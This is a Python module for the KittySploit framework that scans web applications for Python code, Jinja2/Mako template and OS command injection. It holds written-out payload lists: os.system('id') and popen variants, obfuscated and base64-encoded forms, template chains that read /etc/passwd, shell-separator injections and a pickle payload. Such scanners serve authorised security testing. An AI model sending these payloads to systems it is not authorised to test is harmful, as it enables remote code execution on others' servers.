#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import urllib.parse
import time
import re
import base64

class Module(Auxiliary, Http_client):

    __info__ = {
        'name': 'Python Injection Scanner',
        'description': 'Scans for Python injection vulnerabilities including code injection, template injection (Jinja2, Mako), command injection, and pickle deserialization',
        'author': 'KittySploit Team',
        'tags': ['web', 'python', 'injection', 'scanner', 'security', 'rce'],
        'references': [
            'https://owasp.org/www-community/attacks/Code_Injection',
            'https://owasp.org/www-community/attacks/Command_Injection',
            'https://portswigger.net/web-security/os-command-injection',
        ]
    }

    # Python code injection payloads
    PYTHON_CODE_INJECTION_PAYLOADS = [
        # Basic Python code execution
        '__import__("os").system("id")',
        '__import__("os").popen("id").read()',
        '__import__("subprocess").call("id", shell=True)',
        '__import__("subprocess").check_output("id", shell=True)',
        'eval("__import__(\'os\').system(\'id\')")',
        'exec("__import__(\'os\').system(\'id\')")',
        'compile("__import__(\'os\').system(\'id\')", "<string>", "exec")',
        
        # Using builtins
        '__builtins__.__import__("os").system("id")',
        '__builtins__["__import__"]("os").system("id")',
        
        # Obfuscated
        'getattr(__import__("os"), "system")("id")',
        'getattr(getattr(__import__("os"), "system"), "__call__")("id")',
        
        # Base64 encoded
        'eval(__import__("base64").b64decode("X19pbXBvcnRfXygib3MiKS5zeXN0ZW0oImlkIik="))',
    ]

    # Template injection payloads (Jinja2, Mako, etc.)
    TEMPLATE_INJECTION_PAYLOADS = [
        # Jinja2
        '{{7*7}}',
        '{{7*7}}={{49}}',
        '{{config}}',
        '{{self.__init__.__globals__.__builtins__.__import__("os").system("id")}}',
        '{{self.__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}}',
        '{{cycler.__init__.__globals__.os.popen("id").read()}}',
        '{{joiner.__init__.__globals__.os.popen("id").read()}}',
        '{{namespace.__init__.__globals__.os.popen("id").read()}}',
        
        # Mako
        '${7*7}',
        '${__import__("os").system("id")}',
        '${self.module.cache.util.os.system("id")}',
        
        # Django templates (limited)
        '{{7|add:7}}',
        '{{request}}',
    ]

    # Command injection payloads
    COMMAND_INJECTION_PAYLOADS = [
        '; id',
        '| id',
        '`id`',
        '$(id)',
        '; python -c "import os; os.system(\'id\')"',
        '| python -c "import os; os.system(\'id\')"',
        '; python3 -c "import os; os.system(\'id\')"',
        '| python3 -c "import os; os.system(\'id\')"',
        '; sleep 5',
        '| sleep 5',
    ]

    # Pickle deserialization payloads (base64 encoded)
    PICKLE_PAYLOADS = [
        # Basic pickle payload (base64 encoded)
        'gANjcG9zCnN5c3RlbQpxAFgAAABpZHEBhXECUnEDLg==',  # pickle.dumps(os.system('id'))
    ]

    # Parameter names commonly used in Python apps
    PYTHON_PARAMS = [
        'cmd', 'command', 'exec', 'eval', 'code',
        'template', 'view', 'render', 'format',
        'data', 'input', 'value', 'param', 'query',
        'user', 'username', 'email', 'name',
    ]

    def check(self):
        """
        Check if the target is accessible and might be using Python
        """
        try:
            response = self.http_request(method="GET", path="/")
            if response:
                # Check for Python indicators
                content = response.text.lower()
                headers = str(response.headers).lower()
                
                python_indicators = [
                    'python', 'django', 'flask', 'tornado',
                    'jinja2', 'mako', 'werkzeug',
                    'x-powered-by.*python', 'server.*python',
                    'wsgiserver', 'gunicorn', 'uwsgi',
                ]
                
                if any(indicator in content or indicator in headers for indicator in python_indicators):
                    return True
                
                # Check X-Powered-By header
                powered_by = response.headers.get('X-Powered-By', '').lower()
                if 'python' in powered_by or 'django' in powered_by or 'flask' in powered_by:
                    return True
                
                # Check Server header
                server = response.headers.get('Server', '').lower()
                if 'python' in server or 'gunicorn' in server or 'uwsgi' in server:
                    return True
                
                # Even if not detected, continue scanning
                return True
            return False
        except Exception as e:
            return False

    def detect_python_framework(self):
        """
        Detect Python framework
        """
        try:
            response = self.http_request(method="GET", path="/")
            if not response:
                return None
            
            powered_by = response.headers.get('X-Powered-By', '')
            server = response.headers.get('Server', '')
            content = response.text.lower()
            
            # Check for Django
            if 'django' in powered_by.lower() or 'django' in content:
                return "Django"
            
            # Check for Flask
            if 'flask' in powered_by.lower() or 'werkzeug' in powered_by.lower() or 'flask' in content:
                return "Flask"
            
            # Check for Tornado
            if 'tornado' in server.lower() or 'tornado' in content:
                return "Tornado"
            
            # Check for Jinja2
            if 'jinja2' in content:
                return "Jinja2 (template engine)"
            
            # Check for Mako
            if 'mako' in content:
                return "Mako (template engine)"
            
            # Check for Gunicorn/UWSGI
            if 'gunicorn' in server.lower():
                return "Gunicorn (WSGI server)"
            if 'uwsgi' in server.lower():
                return "UWSGI (WSGI server)"
            
            if 'python' in powered_by.lower():
                return "Python Application"
            
            return None
        except Exception as e:
            print_debug(f"Error detecting Python framework: {str(e)}")
            return None

    def test_code_injection(self, payload, param_name='cmd', method='GET'):
        """
        Test Python code injection payload
        
        Args:
            payload: The code injection payload
            param_name: Parameter name to inject into
            method: HTTP method to use
            
        Returns:
            dict: Test results
        """
        try:
            if method == 'GET':
                encoded_payload = urllib.parse.quote(payload)
                test_path = f"/?{param_name}={encoded_payload}"
                response = self.http_request(
                    method="GET",
                    path=test_path,
                    allow_redirects=False
                )
            else:
                post_data = {param_name: payload}
                response = self.http_request(
                    method="POST",
                    path="/",
                    data=post_data,
                    allow_redirects=False
                )
            
            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}
            
            # Analyze response
            is_vulnerable = False
            indicators = []
            
            # Check for command output
            if 'uid=' in response.text or 'gid=' in response.text:
                is_vulnerable = True
                indicators.append('Command output detected (id command)')
            
            # Check for Python errors
            python_errors = [
                'syntaxerror', 'nameerror', 'typeerror',
                'attributeerror', 'importerror', 'indentationerror',
                'traceback', 'file "<string>"', 'file "<stdin>"',
            ]
            
            response_lower = response.text.lower()
            for error in python_errors:
                if error in response_lower:
                    is_vulnerable = True
                    indicators.append(f'Python error: {error}')
                    break
            
            return {
                'payload': payload,
                'param': param_name,
                'method': method,
                'vulnerable': is_vulnerable,
                'indicators': indicators,
                'status_code': response.status_code,
                'response_length': len(response.text)
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def test_template_injection(self, payload, param_name='template', method='GET'):
        """
        Test template injection payload
        
        Args:
            payload: The template injection payload
            param_name: Parameter name to inject into
            method: HTTP method to use
            
        Returns:
            dict: Test results
        """
        try:
            if method == 'GET':
                encoded_payload = urllib.parse.quote(payload)
                test_path = f"/?{param_name}={encoded_payload}"
                response = self.http_request(
                    method="GET",
                    path=test_path,
                    allow_redirects=False
                )
            else:
                post_data = {param_name: payload}
                response = self.http_request(
                    method="POST",
                    path="/",
                    data=post_data,
                    allow_redirects=False
                )
            
            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}
            
            # Check if expression was evaluated
            is_vulnerable = False
            indicators = []
            
            # Check for expression evaluation (e.g., {{7*7}} becomes 49)
            if '{{7*7}}' in payload:
                if '49' in response.text:
                    is_vulnerable = True
                    indicators.append('Expression evaluated (7*7=49) - Jinja2')
            
            if '${7*7}' in payload:
                if '49' in response.text:
                    is_vulnerable = True
                    indicators.append('Expression evaluated (7*7=49) - Mako')
            
            # Check for template errors
            template_errors = [
                'jinja2', 'mako', 'template error',
                'template syntax error', 'undefined',
            ]
            
            response_lower = response.text.lower()
            for error in template_errors:
                if error in response_lower:
                    is_vulnerable = True
                    indicators.append(f'Template error: {error}')
                    break
            
            return {
                'payload': payload,
                'param': param_name,
                'method': method,
                'vulnerable': is_vulnerable,
                'indicators': indicators,
                'status_code': response.status_code
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def test_command_injection(self, payload, param_name='cmd', method='GET'):
        """
        Test command injection payload
        
        Args:
            payload: The command injection payload
            param_name: Parameter name to inject into
            method: HTTP method to use
            
        Returns:
            dict: Test results
        """
        try:
            if method == 'GET':
                encoded_payload = urllib.parse.quote(payload)
                test_path = f"/?{param_name}={encoded_payload}"
                
                start_time = time.time()
                response = self.http_request(
                    method="GET",
                    path=test_path,
                    allow_redirects=False
                )
                elapsed_time = time.time() - start_time
            else:
                post_data = {param_name: payload}
                start_time = time.time()
                response = self.http_request(
                    method="POST",
                    path="/",
                    data=post_data,
                    allow_redirects=False
                )
                elapsed_time = time.time() - start_time
            
            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}
            
            # Analyze response
            is_vulnerable = False
            indicators = []
            
            # Check for command output
            command_outputs = [
                'uid=', 'gid=', 'groups=',  # id command
                'root:', 'bin:', 'daemon:',  # /etc/passwd
            ]
            
            response_lower = response.text.lower()
            for output in command_outputs:
                if output in response_lower:
                    is_vulnerable = True
                    indicators.append(f'Command output: {output}')
                    break
            
            # Check for time-based command injection
            if 'sleep' in payload.lower() and elapsed_time > 4:
                is_vulnerable = True
                indicators.append(f'Time-based delay: {elapsed_time:.2f}s')
            
            return {
                'payload': payload,
                'param': param_name,
                'method': method,
                'vulnerable': is_vulnerable,
                'indicators': indicators,
                'status_code': response.status_code,
                'response_time': elapsed_time
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def run(self):
        """
        Execute the Python injection scan
        """
        self.vulnerabilities = []
        self.test_results = []
        
        print_status("Starting Python injection scan...")
        print_info(f"Target: {self.target}")
        print_info("")
        
        # Detect Python framework
        print_status("Detecting Python framework...")
        framework = self.detect_python_framework()
        if framework:
            print_success(f"Python framework detected: {framework}")
        else:
            print_warning("Could not detect Python framework")
            print_info("Continuing with generic Python injection tests...")
        print_info("")
        
        # Test code injection
        print_status("Testing for Python code injection vulnerabilities...")
        print_info("")
        
        code_params = ['cmd', 'command', 'exec', 'eval', 'code']
        for param in code_params:
            print_info(f"Testing parameter: {param}")
            
            for payload in self.PYTHON_CODE_INJECTION_PAYLOADS[:10]:  # Test first 10 payloads
                result = self.test_code_injection(payload, param, method='GET')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential Python code injection found!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {payload[:60]}...")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info("")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Test template injection
        print_status("Testing for template injection vulnerabilities...")
        print_info("")
        
        template_params = ['template', 'view', 'render', 'format']
        for param in template_params:
            print_info(f"Testing parameter: {param}")
            
            for payload in self.TEMPLATE_INJECTION_PAYLOADS[:10]:  # Test first 10 payloads
                result = self.test_template_injection(payload, param, method='GET')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential template injection found!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {payload[:60]}...")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info("")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Test command injection
        print_status("Testing for command injection vulnerabilities...")
        print_info("")
        
        for param in code_params:
            print_info(f"Testing parameter: {param}")
            
            for payload in self.COMMAND_INJECTION_PAYLOADS[:5]:  # Test first 5 payloads
                result = self.test_command_injection(payload, param, method='GET')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential command injection found!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {payload[:60]}...")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info("")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Summary
        print_status("=" * 60)
        print_status("Python Injection Scan Summary")
        print_status("=" * 60)
        
        if framework:
            print_info(f"Python Framework: {framework}")
        else:
            print_warning("Python Framework: Not detected")
        
        print_info(f"Total tests performed: {len(self.test_results)}")
        print_info(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        print_status("=" * 60)
        print_info("")
        
        if self.vulnerabilities:
            print_warning("Python injection vulnerabilities detected:")
            print_info("")
            
            table_data = []
            for vuln in self.vulnerabilities[:20]:  # Show first 20
                payload_short = vuln['payload'][:40] + '...' if len(vuln['payload']) > 40 else vuln['payload']
                indicators = ', '.join(vuln.get('indicators', [])[:2])
                table_data.append([
                    vuln.get('param', 'N/A'),
                    vuln.get('method', 'GET'),
                    payload_short,
                    indicators
                ])
            
            print_table(['Parameter', 'Method', 'Payload', 'Indicators'], table_data)
            print_info("")
            print_warning("IMPORTANT: These are potential vulnerabilities. Manual verification is required.")
        else:
            print_info("No Python injection vulnerabilities detected during automated testing.")
            print_info("Note: This does not guarantee the application is secure.")
        
        return True
